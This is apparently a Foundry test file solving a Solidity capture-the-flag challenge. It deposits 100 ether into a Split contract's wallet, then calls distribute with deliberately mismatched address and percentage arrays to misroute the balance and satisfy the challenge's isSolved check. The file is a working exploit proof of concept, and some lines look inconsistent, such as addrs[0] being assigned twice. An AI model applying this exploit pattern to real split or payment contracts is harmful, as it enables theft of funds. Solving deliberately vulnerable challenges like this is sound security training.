// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./Challenge.sol";
import "./Split.sol";

contract OneHundredPercentTest is Test {
    function setUp() public {}

    function test_exploit100Percent() public {
        Split split = new Split();

        address[] memory addrs = new address[](2);
        addrs[0] = address(0x000000000000000000000000000000000000dEaD);
        addrs[0] = address(0x000000000000000000000000000000000000bEEF);
        uint32[] memory percents = new uint32[](2);
        percents[0] = 5e5;
        percents[1] = 5e5;

        // addrs[0] = address(0xbbCCdD000000000000000dEAD000000000000000);
        // addrs[1] = address(0x0000bEef00000000000000000012FCd000000000);
        // percents[0] = 5e8;
        // percents[1] = 7e7;

        // bytes memory h1 = abi.encodePacked(addrs, percents, uint32(0));
        // console.log("h1", iToHex(h1));

        uint256 id = split.createSplit(addrs, percents, 0);

        Split.SplitData memory splitData = split.splitsById(id);
        splitData.wallet.deposit{value: 100 ether}();

        Challenge challenge = new Challenge(split);
        assertEq(challenge.isSolved(), false);

        // splitData.wallet.pullToken(IERC20(address(0x00)), 100 ether);

        address[] memory addrs2 = new address[](3);
        addrs2[0] = address(0x000000000000000000000000000000000000bEEF);
        addrs2[1] = address(0x0000000000000000000000000000000000000000);
        addrs2[2] = address(0x000000000000000000000000000000000007A120);
        uint32[] memory percents2 = new uint32[](1);
        percents2[0] = 5e5;
        split.distribute(0, addrs2, percents2, 0, IERC20(address(0x00)));
        console.log("contract balance", address(split).balance);
        console.log("split wallet balance", address(splitData.wallet).balance);
        uint256 beefBalance = split.balances(
            address(0x000000000000000000000000000000000000bEEF),
            address(0x00)
        );
        console.log("beef balance", beefBalance);
        uint256 nullBalance = split.balances(
            address(0x0000000000000000000000000000000000000000),
            address(0x00)
        );
        console.log("null balance", nullBalance);

        // IERC20[] memory tokens = new IERC20[](1);
        // tokens[0] = IERC20(address(0x00));
        // uint256[] memory amounts = new uint256[](1);
        // amounts[0] = address(split).balance;
        // split.withdraw(tokens, amounts);

        assertEq(challenge.isSolved(), true);
    }

    function iToHex(bytes memory buffer) public pure returns (string memory) {
        // Fixed buffer size for hexadecimal convertion
        bytes memory converted = new bytes(buffer.length * 2);

        bytes memory _base = "0123456789abcdef";

        for (uint256 i = 0; i < buffer.length; i++) {
            converted[i * 2] = _base[uint8(buffer[i]) / _base.length];
            converted[i * 2 + 1] = _base[uint8(buffer[i]) % _base.length];
        }

        return string(abi.encodePacked("0x", converted));
    }

    receive() external payable {}
}
